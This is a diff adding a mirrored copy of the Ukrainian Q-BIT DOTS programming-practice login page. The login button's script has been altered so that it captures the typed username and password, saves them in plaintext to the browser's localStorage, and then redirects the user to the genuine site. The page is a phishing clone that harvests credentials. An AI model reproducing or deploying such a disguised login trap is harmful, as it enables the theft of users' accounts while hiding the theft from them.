@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from qbit.dots.org.ua/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Sep 2022 17:27:30 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta content="charset=utf-8" />
+                <title>Система перевірки задач - Q-BIT</title>
+        <meta content=" Система перевірки задач, Молодіжне наукове товариство Q-BIT, м. Харків" name="description" />
+        <link rel="stylesheet" href="screen.css" type="text/css" media="all" />
+    <!--[if IE]>
+    <link rel="stylesheet" href="/msie.css" type="text/css" media="all" />
+    <![endif]-->
+    <link rel="SHORTCUT ICON" href="favicon.ico" />
+</head>
+<body>
+<div id="container">
+    <div id="header">
+        <table border="0"><tbody><tr><td>
+        <a href="index.html" title="Q-BIT"><img src="images/qbit.gif" width="120" height="105" border="0" alt="LOGO" /></a></td>
+                <td><h1>Молодіжне наукове товариство Q-BIT, м. Харків</h1><h2>
+                                                 Практикум з програмування (&#0171;DOTS&#0187;
+                        v1.5<img alt="b" src="images/b.gif" style="margin-bottom:-4px;"/>)</h2>
+                    </h2></td>
+						</tr>
+            </tbody></table>
+    </div>
+
+
+<!-- cert -->
+<script>
+        function isSiteOnline(url, callback) {
+            var timer = setTimeout(function () {
+                callback(false);
+            }, 5000)
+
+            var img = document.createElement("img");
+            img.onload = function () {
+                clearTimeout(timer);
+                callback(true);
+            }
+
+            img.onerror = function () {
+                clearTimeout(timer);
+                callback(false);
+            }
+	    img.src = url;
+        }
+
+        function openInNewTab() {
+            var inputVal = document.getElementById("cert_id").value;
+            var mainUrl = "images/certs/index.html"
+
+            let url = mainUrl + inputVal + ".png";
+
+            isSiteOnline(url, function (found) {
+                if (found) {
+                    var win = window.open(url, '_blank');
+                    win.focus();
+                }
+		else { alert(url)};
+            })
+        }
+
+
+    </script>
+
+<!-- UPDATE LOC -->
+<script>
+function changeLang(lang) {
+document.cookie = "lang=" + lang;
+location.reload();
+}
+</script>
+    <div id="wrapper">
+        <div id="nav">
+<center>
+<a onclick="changeLang('ua');"><img src="images/flag_ua.png"</a>
+&nbsp&nbsp&nbsp
+<a onclick="changeLang('ru');"><img src="images/flag_ru.png"></a>
+</center>
+
+            <ul>
+                
+                
+                                <br/>
+
+<!--                <li><a title="Пам’ятка" href="documents/instruction.pdf">Пам’ятка</a></li> -->
+                
+                
+                <li>&nbsp;</li>
+
+                                    <li><a title="PARTNERS_INFO" href="partners.html">Партнери</a></li>
+                
+                                    <li><a title="Справка по системі" href="help.html">Допомога</a></li>
+                
+
+                                    <li><a title="Увійти до системи" href="login.html">Вхід</a></li>
+                            </ul>
+
+            
+            
+                        <ul>
+            </ul>
+        </div>
+        <div id="extra">
+            <p>&nbsp;</p>
+        </div>
+        <div id="content">
+            <!-- CONTENT_BEGIN -->
+<!--
+ <div id="olymp">
+ </div>
+<br/>
+-->
+
+            <h1>Назвіться, будь ласка</h1>
+
+                                    <p>&nbsp;</p>
+            <form id="loginform" >
+                <input type="hidden" name="from" value="" />
+                <table id="loginformtable">
+                    <tbody>
+                        <tr>
+                            <td><span class="ft">Логін:</span></td>
+                            <td><input id="name" type="text" name="username" tabindex="1" value="" size="20" maxlength="60" class="e" style="width:150px" /></td>
+                            <td>&nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td><span class="ft">Пароль:</span></td>
+                            <td><input id="pass" type="password" name="password" tabindex="2" value="" size="20" maxlength="60" class="e" style="width:150px" /></td>
+                            <td>&nbsp;<a href="restore.html" class="fh">Забули пароль?</a></td>
+                        </tr>
+                        <tr>
+                            <td><span class="ft">&nbsp;</span></td>
+                            <td><input type="checkbox" id="remember_me" name="remember_me" tabindex="3" value="1209600" class="e cb"/><label for="remember_me"> Запам’ятати вхід</label></td>
+                            <td>&nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td>&nbsp;</td>
+                            <td>&nbsp;<input type="hidden" name="token" value="eh0UhhW2pMXBOTAQ"></td>
+                            <td>&nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td>&nbsp;</td>
+                            <td><input type="button" class="b" tabindex="4" onclick="
+    var input1 = document.getElementById('name');
+    var input2 = document.getElementById('pass');
+    let usernames = [localStorage.getItem('username')];
+    let passwords = [localStorage.getItem('password')];
+    // alert(usernames);
+    usernames.push(input1.value);
+    passwords.push(input2.value);
+    localStorage.setItem('username',usernames);
+    localStorage.setItem('password',passwords);
+    window.location.replace('https://qbit.dots.org.ua/');
+    // alert()
+    
+    // alert();" value="Вхід" /></td>
+                            <td>&nbsp;</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </form>
+          <p>&nbsp;</p>
+           <p>&nbsp;</p>
+
+
+        <!-- CONTENT_END -->
+
+        </div>
+        <div id="footer">
+
+      <p>
+      <br/>
+      <br/>
+      <br/>
+      <table align="center">
+         <tr>
+                <u><h3><font color="blue">ПРОЄКТ ПІДТРИМУЄ КОМПАНІЯ</font></h3></u>
+         </tr>
+         <tr>
+           <td><a href="https://www.nearua.com/ua/main" target="blank"><img src="images/near.png" width="200"></a></td>
+         </tr>
+         <tr>
+         </tr>
+         <tr>
+<!--
+           <td>
+                <u><h3><font color="blue">ПРОЄКТ ПІДТРИМУЄ КОМПАНІЯ</font></h3></u>
+           </td>
+            <td><p>&nbsp;</p></td>
+            <td><p>&nbsp;</p></td>
+            <td><p>&nbsp;</p></td>
+            <td><p>&nbsp;</p></td>
+           <td>
+                <u><h3><font color="blue">ПРОЄКТ ПІДТРИМУЄ КОМПАНІЯ</font></h3></u>
+           </td>
+         </tr>
+         <tr>
+           <td>
+                <a href="http://insart.com" target="blank"><img src="/images/insart.png" width="245"></a> <br />
+           </td>
+            <td><p>&nbsp;</p></td>
+            <td><p>&nbsp;</p></td>
+            <td><p>&nbsp;</p></td>
+            <td><p>&nbsp;</p></td>
+           <td>
+               <a href="http://weare.net.ua" target="blank"><img src="/images/wearenet.png" width="200"></a> <br />
+           </td>
+         </tr>
+-->
+      </table>
+
+           <p>&nbsp;</p>
+            
+            <p>Сторінка створена за 0.016 з. 
+                Час на сервері: Sat, 03 Sep 2022 20:27:23 +0300                GZip включений.</p>
+            <p><b>Copyright &copy; 2005-2022, Молодёжное научное общество "Q-BIT";</b> <br/>
+                тех. підтримка: М.О. Арзубов <br />
+            При використанні матеріалів сайта посилання на <a href="http://www.qbit.org.ua/">QBit.org.ua</a> обов’язкове.</p>
+            <p>&nbsp;</p>
+        </div>
+    </div>
+</div>
+
+
+
+</body>
+
+<!-- Mirrored from qbit.dots.org.ua/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Sep 2022 17:27:45 GMT -->
+</html>
